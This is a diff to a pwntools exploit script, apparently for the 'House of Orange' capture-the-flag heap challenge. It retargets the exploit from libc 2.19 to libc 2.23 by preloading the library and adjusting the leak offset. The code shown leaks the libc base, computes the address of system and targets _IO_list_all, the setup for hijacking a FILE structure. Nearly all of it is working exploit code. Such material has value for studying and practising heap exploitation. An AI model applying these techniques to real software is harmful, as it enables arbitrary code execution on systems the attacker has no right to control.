@@ -1,9 +1,13 @@
 from pwn import *
 #context(os='linux', arch='amd64', log_level='debug')
 
-io = process('./orange')
+env = {}
+env = {'LD_PRELOAD' : './libc-2.23.so'}
+io = process('./orange', env=env)
+
+
 elf = ELF('./orange')
-libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
+libc = ELF('libc-2.23.so')
 
 def build(Length,Name,Price,Choice):
     io.recvuntil('Your choice : ')
@@ -44,7 +48,7 @@ build(0x1000,'CCCC',3,3)
 build(0x400,'D'*8,4,4)
 see()
 io.recvuntil('Name of house : DDDDDDDD')
-libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
+libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c4b20-0x668
 system_addr = libc_base+libc.symbols['system']
 log.info('system_addr:'+hex(system_addr))
 IO_list_all = libc_base+libc.symbols['_IO_list_all']
